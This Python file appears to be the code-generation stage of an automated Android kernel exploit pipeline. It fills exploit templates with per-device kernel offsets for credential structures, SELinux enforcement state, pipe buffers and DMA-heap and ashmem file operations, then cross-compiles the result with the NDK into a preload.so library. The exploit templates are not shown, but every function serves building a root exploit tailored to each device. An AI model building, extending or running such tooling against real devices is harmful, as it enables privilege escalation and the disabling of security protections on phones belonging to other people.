"""Stage 6: Generate exploit code and compile.

Renders the C exploit template with offset values and cross-compiles
for the target architecture to produce preload.so.
"""

from __future__ import annotations

import datetime
import logging
import os
import re
import shutil
import subprocess
from pathlib import Path
from typing import Any

from jinja2 import Environment, FileSystemLoader

logger = logging.getLogger(__name__)

# Mapping from offset_calc keys to target.h.j2 / offsets.h.j2 template keys
SUFFIX_MAP: dict[str, str] = {
    "INIT_TASK": "INIT_TASK_OFF",
    "INIT_CRED": "INIT_CRED_OFF",
    "SELINUX_ENFORCING": "SELINUX_ENFORCING_OFF",
    "SELINUX_STATE": "SELINUX_STATE_OFF",
    "ANON_PIPE_BUF_OPS": "ANON_PIPE_BUF_OPS_SYM_OFF",
    "KMALLOC_CACHES": "KMALLOC_CACHES_OFF",
    "NFULNL_LOGGER": "SLIDE_NFULNL_LOGGER_OFF",
    "SECURITY_HOOK_HEADS": "SECURITY_HOOK_HEADS_OFF",
    "DMA_HEAP_FOPS": "DMA_HEAP_FOPS_OFF",
    "ASHMEM_FOPS": "ASHMEM_FOPS_OFF",
}

# Layout keys that belong in the layout section, NOT in the offsets loop
LAYOUT_KEYS = {"KIMAGE_TEXT_BASE", "PAGE_OFFSET", "VMEMMAP_START", "MODULES_VADDR", "VA_BITS"}

# Mapping from offset_calc layout keys (UPPER_CASE) to target.h.j2 layout keys (lower_case)
LAYOUT_KEY_MAP: dict[str, str] = {
    "KIMAGE_TEXT_BASE": "kimage_text_base",
    "PAGE_OFFSET": "page_offset",
    "VMEMMAP_START": "vmemmap_start",
    "MODULES_VADDR": "modules_vaddr",
    "VA_BITS": "va_bits",
}

# Mapping from (struct_name, field_name) to template offset key
STRUCT_FIELD_MAP: dict[tuple[str, str], str] = {
    ("task_struct", "cred"): "TASK_CRED_OFF",
    ("task_struct", "real_cred"): "TASK_REAL_CRED_OFF",
    ("task_struct", "pid"): "TASK_PID_OFF",
    ("task_struct", "tasks"): "TASK_TASKS_OFF",
    ("task_struct", "seccomp"): "TASK_SECCOMP_OFF",
    ("task_struct", "flags"): "TASK_FLAGS_OFF",
    ("cred", "uid"): "CRED_UID_OFF",
    ("cred", "gid"): "CRED_GID_OFF",
    ("cred", "euid"): "CRED_EUID_OFF",
    ("cred", "egid"): "CRED_EGID_OFF",
    ("cred", "cap_effective"): "CRED_CAP_EFF_OFF",
    ("cred", "cap_inheritable"): "CRED_CAP_INH_OFF",
    ("cred", "cap_permitted"): "CRED_CAP_PERM_OFF",
    ("cred", "cap_bset"): "CRED_CAP_BSET_OFF",
    ("cred", "security"): "CRED_SECURITY_OFF",
    ("pipe_buffer", "page"): "PIPE_BUF_PAGE_OFF",
    ("pipe_buffer", "ops"): "PIPE_BUF_OPS_OFF",
    ("pipe_buffer", "flags"): "PIPE_BUF_FLAGS_OFF",
    ("pipe_buffer", "private"): "PIPE_BUF_PRIVATE_OFF",
    ("mm_struct", "start_code"): "MM_START_CODE_OFF",
    ("mm_struct", "end_code"): "MM_END_CODE_OFF",
    ("mm_struct", "start_data"): "MM_START_DATA_OFF",
    ("mm_struct", "end_data"): "MM_END_DATA_OFF",
    ("mm_struct", "start_brk"): "MM_START_BRK_OFF",
    ("mm_struct", "brk"): "MM_BRK_OFF",
    ("mm_struct", "start_stack"): "MM_START_STACK_OFF",
}


def _get_template_env() -> Environment:
    """Get Jinja2 environment pointing to the templates directory."""
    templates_dir = Path(__file__).parent.parent.parent / "templates"
    return Environment(
        loader=FileSystemLoader(str(templates_dir)),
        keep_trailing_newline=True,
    )


def _run_cmd(
    cmd: list[str],
    *,
    timeout: int = 300,
    cwd: str | Path | None = None,
) -> subprocess.CompletedProcess[str]:
    """Run a subprocess command and return the result."""
    logger.debug("Running: %s", " ".join(cmd))
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, cwd=cwd)


def build_template_data(prev_result: dict[str, Any]) -> dict[str, Any]:
    """Build all data needed by Jinja2 templates from prev_result.

    Returns a dict with: template_offsets, template_layout,
    template_offset_sources, template_confidence, and other
    template variables.
    """
    raw_offsets = prev_result.get("offsets", {})
    raw_layout = prev_result.get("layout", {})
    raw_struct_offsets = prev_result.get("struct_offsets", {})
    raw_offset_sources = prev_result.get("offset_sources", {})

    # ── Symbol offsets (exclude layout keys to avoid duplicate #defines) ──
    # Symbol offsets MUST always be defined (no fallbacks in template),
    # so default to 0 if not found.
    template_offsets: dict[str, Any] = {}
    for src_key, dst_key in SUFFIX_MAP.items():
        if src_key in raw_offsets:
            template_offsets[dst_key] = raw_offsets[src_key]
        else:
            template_offsets[dst_key] = 0  # no fallback in template; 0 means "unresolved"

    # ── Struct field offsets ──
    # Struct offsets have arch-based fallbacks in offsets.h.j2, so only
    # include them if actually found. Missing ones will use the template's
    # `{% elif is_gki %}` / `{% else %}` fallbacks.
    for (struct_name, field_name), dst_key in STRUCT_FIELD_MAP.items():
        struct = raw_struct_offsets.get(struct_name, {})
        if field_name in struct and struct[field_name] != 0:
            template_offsets[dst_key] = struct[field_name]

    # ── Layout (lowercase keys for target.h.j2) ──
    template_layout: dict[str, Any] = {}
    for src_key, dst_key in LAYOUT_KEY_MAP.items():
        if src_key in raw_layout:
            template_layout[dst_key] = raw_layout[src_key]

    # ── Offset sources mapping ──
    template_offset_sources: dict[str, str] = {}
    for src_key, dst_key in SUFFIX_MAP.items():
        if src_key in raw_offset_sources:
            template_offset_sources[dst_key] = raw_offset_sources[src_key]
    for (struct_name, field_name), dst_key in STRUCT_FIELD_MAP.items():
        src_key = f"{struct_name}.{field_name}"
        if src_key in raw_offset_sources:
            template_offset_sources[dst_key] = raw_offset_sources[src_key]

    # ── Confidence report ──
    template_confidence: dict[str, str] = {}
    for key in template_offsets:
        src = template_offset_sources.get(key, "UNKNOWN")
        if "missing" in src:
            template_confidence[key] = "LOW"
        elif "infer" in src.lower():
            template_confidence[key] = "MEDIUM"
        else:
            template_confidence[key] = "HIGH"

    return {
        "template_offsets": template_offsets,
        "template_symbol_offsets": {
            k: v for k, v in template_offsets.items()
            if k in {dst for dst in SUFFIX_MAP.values()}
        },
        "template_struct_offsets": {
            k: v for k, v in template_offsets.items()
            if k in {dst for dst in STRUCT_FIELD_MAP.values()}
        },
        "template_layout": template_layout,
        "template_offset_sources": template_offset_sources,
        "template_confidence": template_confidence,
    }


def generate_target_h(
    output_dir: str | Path,
    device_name: str,
    kernel_version: str | None,
    arch: str,
    is_gki: bool,
    memory_type: str,
    template_offsets: dict[str, Any],
    template_symbol_offsets: dict[str, Any],
    template_layout: dict[str, Any],
    template_offset_sources: dict[str, str],
    template_confidence: dict[str, str],
) -> Path:
    """Render target.h from the target.h.j2 template.

    Returns:
        Path to the generated target.h file.
    """
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    env = _get_template_env()
    template = env.get_template("exploit/target.h.j2")
    content = template.render(
        device_name=device_name,
        kernel_version=kernel_version or "unknown",
        arch=arch,
        is_gki=is_gki,
        memory_type=memory_type,
        build_date=datetime.datetime.now().isoformat(),
        offsets=template_offsets,
        symbol_offsets=template_symbol_offsets,
        offset_sources=template_offset_sources,
        confidence_report=template_confidence,
        layout=template_layout,
    )

    target_h_path = out_dir / "target.h"
    target_h_path.write_text(content)
    logger.info("Generated target.h: %s", target_h_path)
    return target_h_path


def generate_offsets_h(
    output_dir: str | Path,
    device_name: str,
    kernel_version: str | None,
    arch: str,
    is_gki: bool,
    memory_type: str,
    template_offsets: dict[str, Any],
    template_layout: dict[str, Any],
    template_offset_sources: dict[str, str],
    template_confidence: dict[str, str],
) -> Path:
    """Render offsets.h from the offsets.h.j2 template.

    Returns:
        Path to the generated offsets.h file.
    """
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    env = _get_template_env()
    template = env.get_template("exploit/offsets.h.j2")
    content = template.render(
        device_name=device_name,
        kernel_version=kernel_version or "unknown",
        arch=arch,
        is_gki=is_gki,
        memory_type=memory_type,
        build_date=datetime.datetime.now().isoformat(),
        offsets=template_offsets,
        offset_sources=template_offset_sources,
        confidence_report=template_confidence,
        layout=template_layout,
    )

    offsets_h_path = out_dir / "offsets.h"
    offsets_h_path.write_text(content)
    logger.info("Generated offsets.h: %s", offsets_h_path)
    return offsets_h_path


def generate_exploit_c(
    output_dir: str | Path,
    device_name: str,
    memory_type: str,
    kernel_version: str | None,
    kernel_is_gki: bool,
    arch: str,
    template_offsets: dict[str, Any],
    template_layout: dict[str, Any],
) -> Path:
    """Render exploit.c from the universal exploit.c.j2 template.

    Returns:
        Path to the generated exploit.c file.
    """
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    # Parse kernel version
    kernel_major = 0
    kernel_minor = 0
    if kernel_version:
        m = re.match(r"(\d+)\.(\d+)", kernel_version)
        if m:
            kernel_major = int(m.group(1))
            kernel_minor = int(m.group(2))

    env = _get_template_env()
    template = env.get_template("exploit/exploit.c.j2")
    content = template.render(
        device_name=device_name,
        memory_type=memory_type,
        is_gki=kernel_is_gki,
        kernel_major=kernel_major,
        kernel_minor=kernel_minor,
        arch=arch,
        offsets=template_offsets,
        layout=template_layout,
    )

    exploit_c_path = out_dir / "exploit.c"
    exploit_c_path.write_text(content)
    logger.info("Generated exploit.c: %s", exploit_c_path)
    return exploit_c_path


def compile_exploit(
    src_dir: str | Path,
    output_dir: str | Path,
    arch: str = "aarch64",
) -> Path | None:
    """Cross-compile exploit with NDK.

    Args:
        src_dir: Directory containing exploit.c and headers.
        output_dir: Directory for compiled output.
        arch: Target architecture.

    Returns:
        Path to the compiled binary, or None on failure.
    """
    src = Path(src_dir)
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    exploit_c = src / "exploit.c"
    if not exploit_c.exists():
        logger.error("exploit.c not found: %s", exploit_c)
        return None

    # Verify headers exist
    if not (src / "target.h").exists():
        logger.error("target.h not found in %s", src)
        return None
    if not (src / "offsets.h").exists():
        logger.error("offsets.h not found in %s", src)
        return None

    output_bin = out_dir / "preload.so"

    # Target triple map for --target flag
    target_map: dict[str, str] = {
        "aarch64": "aarch64-linux-android35",
        "arm": "armv7a-linux-androideabi35",
        "x86_64": "x86_64-linux-android35",
    }
    target_triple = target_map.get(arch, "aarch64-linux-android35")

    # Find the real clang binary (not the shell script wrapper).
    # NDK's *-clang scripts use #!/usr/bin/env bash which fails when
    # invoked from Python subprocess in some CI environments.
    # The actual clang binary is at <ndk>/bin/clang — an ELF executable.
    ndk_home = os.environ.get("ANDROID_NDK_HOME", "")
    clang_bin = "clang"  # fallback
    ndk_sysroot = ""
    if ndk_home:
        ndk_bin = Path(ndk_home) / "toolchains" / "llvm" / "prebuilt" / "linux-x86_64" / "bin"
        # Prefer the real clang binary over the shell wrapper
        real_clang = ndk_bin / "clang"
        if real_clang.exists():
            clang_bin = str(real_clang)
            logger.info("Using real clang binary: %s", clang_bin)
            # Sysroot for Android headers
            ndk_sysroot = str(
                Path(ndk_home) / "toolchains" / "llvm" / "prebuilt" / "linux-x86_64" / "sysroot"
            )
        else:
            # Fallback: try the wrapper script
            wrapper = ndk_bin / f"{target_triple}-clang"
            if wrapper.exists():
                clang_bin = str(wrapper)
                logger.info("Using clang wrapper: %s", clang_bin)

    logger.info("Compiling exploit with %s --target=%s for %s...", clang_bin, target_triple, arch)

    # Verify compiler exists
    if not Path(clang_bin).exists() and not shutil.which(clang_bin):
        logger.error(
            "Compiler not found: %s (ANDROID_NDK_HOME=%s)",
            clang_bin, os.environ.get("ANDROID_NDK_HOME", ""),
        )
        return None

    cmd = [
        clang_bin,
        f"--target={target_triple}",
        "-O2",
        "-Wall",
        "-Wno-#warnings",
    ]
    if ndk_sysroot:
        cmd.append(f"--sysroot={ndk_sysroot}")
    cmd.extend([
        f"-I{src}",
        "-shared",
        "-o", str(output_bin),
        str(exploit_c),
    ])

    proc = _run_cmd(cmd, cwd=str(src))
    if proc.returncode != 0:
        error_parts = []
        if proc.stdout:
            error_parts.append(f"STDOUT:\n{proc.stdout}")
        if proc.stderr:
            error_parts.append(f"STDERR:\n{proc.stderr}")
        if not error_parts:
            error_parts.append("(no output — compiler may have crashed)")
        logger.error(
            "Compilation failed (command: %s):\n%s",
            " ".join(cmd), "\n".join(error_parts),
        )
        return None

    if not output_bin.exists():
        logger.error("Compiler produced no output")
        return None

    logger.info("Compiled preload.so: %s (%d bytes)", output_bin, output_bin.stat().st_size)
    return output_bin


def run(
    prev_result: dict[str, Any],
    work_dir: str | Path,
    device_config: dict[str, Any],
) -> dict[str, Any]:
    """Main entry point for codegen stage.

    Args:
        prev_result: Combined results from previous stages.
        work_dir: Working directory.
        device_config: Device configuration.

    Returns:
        dict with paths to generated files.
    """
    work = Path(work_dir)
    src_dir = work / "codegen"
    output_dir = work / "output"

    device_name = device_config.get("name", "unknown")
    memory_type = prev_result.get("memory_type", "dma_heap")
    kernel_version = prev_result.get("kernel_version")
    arch = prev_result.get("arch", "aarch64")
    is_gki = prev_result.get("kernel_is_gki", False)

    result: dict[str, Any] = {
        "exploit_c_path": None,
        "preload_so_path": None,
    }

    # ── Build template data from prev_result ──
    tdata = build_template_data(prev_result)
    template_offsets = tdata["template_offsets"]
    template_symbol_offsets = tdata["template_symbol_offsets"]
    template_struct_offsets = tdata["template_struct_offsets"]
    template_layout = tdata["template_layout"]
    template_offset_sources = tdata["template_offset_sources"]
    template_confidence = tdata["template_confidence"]

    logger.info("Template offsets: %d entries mapped", len(template_offsets))
    logger.debug("Template offsets keys: %s", sorted(template_offsets.keys()))
    logger.debug("Template layout: %s", template_layout)

    # ── Generate headers from Jinja2 templates ──
    # These templates define the macros that exploit.c.j2 expects
    # (INIT_TASK_OFF, TASK_CRED_OFF, etc.) with proper fallbacks.
    generate_target_h(
        output_dir=src_dir,
        device_name=device_name,
        kernel_version=kernel_version,
        arch=arch,
        is_gki=is_gki,
        memory_type=memory_type,
        template_offsets=template_offsets,
        template_symbol_offsets=template_symbol_offsets,
        template_layout=template_layout,
        template_offset_sources=template_offset_sources,
        template_confidence=template_confidence,
    )
    generate_offsets_h(
        output_dir=src_dir,
        device_name=device_name,
        kernel_version=kernel_version,
        arch=arch,
        is_gki=is_gki,
        memory_type=memory_type,
        template_offsets=template_offsets,
        template_layout=template_layout,
        template_offset_sources=template_offset_sources,
        template_confidence=template_confidence,
    )

    # ── Generate exploit.c ──
    exploit_c_path = generate_exploit_c(
        output_dir=src_dir,
        device_name=device_name,
        memory_type=memory_type,
        kernel_version=kernel_version,
        kernel_is_gki=is_gki,
        arch=arch,
        template_offsets=template_offsets,
        template_layout=template_layout,
    )
    result["exploit_c_path"] = exploit_c_path

    # ── Compile exploit → preload.so ──
    exploit_bin = compile_exploit(src_dir, output_dir / device_name, arch=arch)
    if exploit_bin:
        result["preload_so_path"] = exploit_bin

    # ── Copy artifacts to device output directory ──
    device_output_dir = output_dir / device_name
    device_output_dir.mkdir(parents=True, exist_ok=True)

    for name in ("target.h", "offsets.h", "exploit.c"):
        src_file = src_dir / name
        if src_file.exists():
            shutil.copy2(src_file, device_output_dir / name)

    logger.info(
        "Codegen complete for %s: exploit_c=%s, preload_so=%s",
        device_name, exploit_c_path, exploit_bin,
    )

    return result
